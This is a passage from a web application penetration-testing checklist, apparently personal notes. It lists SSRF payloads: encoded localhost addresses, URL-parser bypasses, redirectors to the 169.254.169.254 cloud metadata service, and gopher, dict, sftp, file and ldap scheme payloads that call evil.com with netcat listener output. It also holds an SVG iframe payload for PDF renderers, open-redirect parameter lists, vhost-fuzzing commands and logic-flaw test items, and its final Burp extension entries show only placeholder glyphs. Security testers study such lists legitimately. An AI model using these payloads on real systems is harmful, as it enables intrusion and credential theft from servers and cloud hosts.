            2130706433
            0x7F.0x00.0x00.0x01
            0x7F.1
            0x7F000001
            
            # Quick URL based bypasses:
            http://google.com:80+&@127.88.23.245:22/#+@google.com:80/
            http://127.88.23.245:22/+&@google.com:80#+@google.com:80/
            http://google.com:80+&@google.com:80#+@127.88.23.245:22/
            http://127.88.23.245:22/?@google.com:80/
            http://127.88.23.245:22/#@www.google.com:80/
            
            # 301 responses:
            https://ssrf.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpg
            https://ssrf.localdomain.pw/img-without-body-md/301-http-.i.jpg
            https://ssrf.localdomain.pw/img-with-body/301-http-169.254.169.254:80-.i.jpg
            https://ssrf.localdomain.pw/img-with-body-md/301-http-.i.jpg
            
            # 301 json:
            https://ssrf.localdomain.pw/json-without-body/301-http-169.254.169.254:80-.j.json
            https://ssrf.localdomain.pw/json-without-body-md/301-http-.j.json
            https://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json
            https://ssrf.localdomain.pw/json-with-body-md/301-http-.j.json
            
            # 301 csv:
            https://ssrf.localdomain.pw/csv-without-body/301-http-169.254.169.254:80-.c.csv
            https://ssrf.localdomain.pw/csv-without-body-md/301-http-.c.csv
            https://ssrf.localdomain.pw/csv-with-body/301-http-169.254.169.254:80-.c.csv
            https://ssrf.localdomain.pw/csv-with-body-md/301-http-.c.csv
            
            # 301 xml:
            https://ssrf.localdomain.pw/xml-without-body/301-http-169.254.169.254:80-.x.xml
            https://ssrf.localdomain.pw/xml-without-body-md/301-http-.x.xml
            https://ssrf.localdomain.pw/xml-with-body/301-http-169.254.169.254:80-.x.xml
            https://ssrf.localdomain.pw/xml-with-body-md/301-http-.x.xml
            
            # 301 pdf:
            https://ssrf.localdomain.pw/pdf-without-body/301-http-169.254.169.254:80-.p.pdf
            https://ssrf.localdomain.pw/pdf-without-body-md/301-http-.p.pdf
            https://ssrf.localdomain.pw/pdf-with-body/301-http-169.254.169.254:80-.p.pdf
            https://ssrf.localdomain.pw/pdf-with-body-md/301-http-.p.pdf
            
            # 30x custom:
            https://ssrf.localdomain.pw/custom-30x/?code=332&url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json
            
            # 20x custom:
            https://ssrf.localdomain.pw/custom-200/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json
            
            # 201 custom:
            https://ssrf.localdomain.pw/custom-201/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json
            
            # HTML iframe + URL bypass
            http://ssrf.localdomain.pw/iframe/?proto=http&ip=127.0.0.1&port=80&url=/
            
            # SFTP
            http://whatever.com/ssrf.php?url=sftp://evil.com:11111/
            
            evil.com:$ nc -v -l 11111
            Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)
            SSH-2.0-libssh2_1.4.2
            
            # Dict
            http://safebuff.com/ssrf.php?dict://attacker:11111/
            
            evil.com:$ nc -v -l 11111
            Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)
            CLIENT libcurl 7.40.0
            
            # gopher
            # http://safebuff.com/ssrf.php?url=http://evil.com/gopher.php
            <?php
                    header('Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest');
            ?>
            
            evil.com:# nc -v -l 12346
            Listening on [0.0.0.0] (family 0, port 12346)
            Connection from [192.168.0.10] port 12346 [tcp/*] accepted (family 2, sport 49398)
            HI
            Multiline
            test
            
            # TFTP
            # http://safebuff.com/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
            
            evil.com:# nc -v -u -l 12346
            Listening on [0.0.0.0] (family 0, port 12346)
            TESTUDPPACKEToctettsize0blksize512timeout6
            
            # file
            http://safebuff.com/redirect.php?url=file:///etc/passwd
            
            # ldap
            http://safebuff.com/redirect.php?url=ldap://localhost:11211/%0astats%0aquit
            
            # SSRF Bypasses
            ?url=http://safesite.com&site.com
            ?url=http://////////////site.com/
            ?url=http://site@com/account/edit.aspx
            ?url=http://site.com/account/edit.aspx
            ?url=http://safesite.com?.site.com
            ?url=http://safesite.com#.site.com
            ?url=http://safesite.com\.site.com/domain
            ?url=https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
            ?url=https://192.10.10.3/
            ?url=https://192.10.10.2?.192.10.10.3/
            ?url=https://192.10.10.2#.192.10.10.3/
            ?url=https://192.10.10.2\.192.10.10.3/
            ?url=http://127.0.0.1/status/
            ?url=http://localhost:8000/status/
            ?url=http://site.com/domain.php
            <?php
            header(‘Location: http://127.0.0.1:8080/status');
            ?>
            
            # Localhost bypasses
            0
            127.00.1
            127.0.01
            0.00.0
            0.0.00
            127.1.0.1
            127.10.1
            127.1.01
            0177.1
            0177.0001.0001
            0x0.0x0.0x0.0x0
            0000.0000.0000.0000
            0x7f.0x0.0x0.0x1
            0177.0000.0000.0001
            0177.0001.0000..0001
            0x7f.0x1.0x0.0x1
            0x7f.0x1.0x1
            
            # Blind SSRF
            - Review Forms
            - Contact Us
            - Password fields
            - Contact or profile info (Names, Addresses)
            - User Agent
            
            # SSRF through video upload
            # https://hackerone.com/reports/1062888
            # https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS
            
            # SSRF in pdf rendering
            <svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="highcharts-root" width="800" height="500">
                <g>
                    <foreignObject width="800" height="500">
                        <body xmlns="http://www.w3.org/1999/xhtml">
                            <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
                        </body>
                    </foreignObject>
                </g>
            </svg>
            ```
            
        - Bypasses
            
            ```jsx
            http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
            http://%73%68%6d%69%6c%6f%6e%2e%63%6f%6d
            http://////////////site.com/
            http://0000::1:80/
            http://000330.0000072.0000326.00000343
            http://000NaN.000NaN
            http://0177.00.00.01
            http://017700000001
            http://0330.072.0326.0343
            http://033016553343
            http://0NaN
            http://0NaN.0NaN
            http://0x0NaN0NaN
            http://0x7f000001/
            http://0xd8.0x3a.0xd6.0xe3
            http://0xd8.0x3a.0xd6e3
            http://0xd8.0x3ad6e3
            http://0xd83ad6e3
            http://0xNaN.0xaN0NaN
            http://0xNaN.0xNa0x0NaN
            http://0xNaN.0xNaN
            http://127.0.0.1/status/
            http://127.1/
            http://2130706433/
            http://216.0x3a.00000000326.0xe3
            http://3627734755
            http://[::]:80/
            http://localhost:8000/status/
            http://NaN
            http://safesite.com#.site.com
            http://safesite.com&site.com
            http://safesite.com?.site.com
            http://safesite.com\.site.com/domain
            http://shmilon.0xNaN.undefined.undefined
            http://site.com/account/edit.aspx
            http://site.com/domain.php
            http://site@com/account/edit.aspx
            http://whitelisted@127.0.0.1
            https://192.10.10.2#.192.10.10.3/
            https://192.10.10.2?.192.10.10.3/
            https://192.10.10.2\.192.10.10.3/
            https://192.10.10.3/
            https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
            <?php
            header('Location: http://127.0.0.1:8080/status');
            ?>
            
            # Tool
            # https://h.43z.one/ipconverter/
            ```
            
        - Open Redirection Testing
            - Common injection parameters
                
                ```markup
                /{payload}
                ?next={payload}
                ?url={payload}
                ?target={payload}
                ?rurl={payload}
                ?dest={payload}
                ?destination={payload}
                ?redir={payload}
                ?redirect_uri={payload}
                ?redirect_url={payload}
                ?redirect={payload}
                /redirect/{payload}
                /cgi-bin/redirect.cgi?{payload}
                /out/{payload}
                /out?{payload}
                ?view={payload}
                /login?to={payload}
                ?image_url={payload}
                ?go={payload}
                ?return={payload}
                ?returnTo={payload}
                ?return_to={payload}
                ?checkout_url={payload}
                ?continue={payload}
                ?return_path={payload}
                
                ```
                
            - [ ]  Use burp 'find' option in order to find parameters such as URL, red, redirect, redir, origin, redirect_uri, target etc
            - [ ]  Check the value of these parameter which may contain a URL
            - [ ]  Change the URL value to [www.tushar.com](http://www.chintan.com/) and check if gets redirected or not
            - [ ]  Try Single Slash and url encoding
            - [ ]  Using a whitelisted domain or keyword
            - [ ]  Using // to bypass http blacklisted keyword
            - [ ]  Using https: to bypass // blacklisted keyword
            - [ ]  Using \\ to bypass // blacklisted keyword
            - [ ]  Using \/\/ to bypass // blacklisted keyword
            - [ ]  Using null byte %00 to bypass blacklist filter
            - [ ]  Using ° symbol to bypass
- [ ]  xmlrpc.php DOS and user enumeration
- [ ]  HTTP dangerous methods OPTIONS PUT DELETE
- [ ]  Try to discover hidden parameters ([arjun](https://github.com/s0md3v/Arjun) or [parameth](https://github.com/maK-/parameth))
- [ ]  Insecure deserialization

### Error Handling

- [ ]  Access custom pages like /whatever_fake.php (.aspx,.html,.etc)
- [ ]  Add multiple parameters in GET and POST request using different values
- [ ]  Add "[]", "]]", and "[[" in cookie values and parameter values to create errors
- [ ]  Generate error by giving input as "/~randomthing/%s" at the end of URL
- [ ]  Use Burp Intruder "Fuzzing Full" List in input to generate error codes
- [ ]  Try different HTTP Verbs like PATCH, DEBUG or wrong like FAKE

### Application Logic

- [ ]  Identify the logic attack surface
- [ ]  Test for reliance on client-side input validation
- [ ]  Thick-client components (Java, ActiveX, Flash)
- [ ]  Multi-stage processes for logic flaws
- [ ]  Handling of incomplete input
- [ ]  Trust boundaries
- [ ]  Transaction logic
- [ ]  Implemented CAPTCHA in email forms to avoid flooding
- [ ]  Tamper product id, price or quantity value in any action (add, modify, delete, place, pay...)
- [ ]  Tamper gift or discount codes
- [ ]  Reuse gift codes
- [ ]  Try parameter pollution to use gift code two times in same request
- [ ]  Try stored XSS in non-limited fields like address
- [ ]  Check in payment form if CVV and card number is in clear text or masked
- [ ]  Check if is processed by the app itself or sent to 3rd parts
- [ ]  IDOR from other users details ticket/cart/shipment
- [ ]  Check for test credit card number allowed like 4111 1111 1111 1111 ([sample1](https://www.paypalobjects.com/en_GB/vhelp/paypalmanager_help/credit_card_numbers.htm) [sample2](http://support.worldpay.com/support/kb/bg/testandgolive/tgl5103.html))
- [ ]  Check PRINT or PDF creation for IDOR
- [ ]  Check unsubscribe button with user enumeration
- [ ]  Parameter pollution on social media sharing links
- [ ]  Change POST sensitive requests to GET

### Infrastructure

- [ ]  Segregation in shared infrastructures
- [ ]  Segregation between ASP-hosted applications
- [ ]  Web server vulnerabilities
- [ ]  Dangerous HTTP methods
- [ ]  Proxy functionality
- Virtual hosting misconfiguration ([VHostScan](https://github.com/codingo/VHostScan))
    - Tools
        
        ```jsx
        # https://github.com/jobertabma/virtual-host-discovery
        ruby scan.rb --ip=192.168.1.101 --host=domain.tld
        
        # https://github.com/dariusztytko/vhosts-sieve
        python3 vhosts-sieve.py -d domains.txt -o vhosts.txt
        
        # Enum vhosts
        fierce -dns example.com
        
        # https://github.com/codingo/VHostScan
        VHostScan -t example.com
        ```
        
    - Techniques
        
        ```jsx
        # ffuf
        badresponse=$(curl -s -H "host: totallynotexistsforsure.bugcrowd.com" https://bugcrowd.com | wc -c)
        ffuf -u https://TARGET.com -H "Host: FUZZ.TARGET.com" -w werdlists/dns-hostnames/nmap-vhosts-all.txt -fs $badresponse
        
        # Manual with subdomains list
        for sub in $(cat subdomains.txt); do
                    echo "$sub $(dig +short a $sub | tail -n1)" | anew -q subdomains_ips.txt
        done
        ```
        
- [ ]  Check for internal numeric IP's in request
- [ ]  Check for external numeric IP's and resolve it
- [ ]  Test [cloud](https://www.notion.so/enumeration/cloud/cloud-info-recon) storage
- [ ]  Check the existence of alternative channels (www.web.com vs m.web.com)

### **Other Test Cases (All Categories)**

- Testing for Role authorization
    - [ ]  Check if normal user can access the resources of high privileged users?
    - [ ]  Forced browsing
    - [ ]  Insecure direct object reference
    - [ ]  Parameter tampering to switch user account to high privileged user
- Check for security headers and at least
    - [ ]  X Frame Options
    - [ ]  X-XSS header
    - [ ]  HSTS header
    - [ ]  CSP header
    - [ ]  Referrer Policy
    - [ ]  Cache Control
    - [ ]  Public key pins
    - [ ]  X-Content-Type-Options
    - [ ]  Expires
- Blind OS command injection
    - [ ]  using time delays
    - [ ]  by redirecting output
    - [ ]  with out-of-band interaction
    - [ ]  with out-of-band data exfiltration
- [ ]  Command injection on CSV export (Upload/Download)
- [ ]  CSV Excel Macro Injection
- [ ]  If you find phpinfo.php file, check for the configuration leakage and try to exploit any network vulnerability.
- [ ]  Parameter Pollution Social Media Sharing Buttons
- Broken Cryptography
    - [ ]  Cryptography Implementation Flaw
    - [ ]  Encrypted Information Compromised
    - [ ]  Weak Ciphers Used for Encryption
- Web Services Testing
    - [ ]  Test for directory traversal
    - [ ]  Web services documentation disclosure Enumeration of services, data types, input types boundaries and limits

### **Burp Suite Extensions**

- Scanners
    - [ ]  ‣
    - [ ]  ‣
    - [ ]  ‣
- Information Gathering
    - [ ]  ‣
    - [ ]  ‣
    - [ ]  ‣
    - [ ]  ‣
- Vulnerability Analysis
    - [ ]  ‣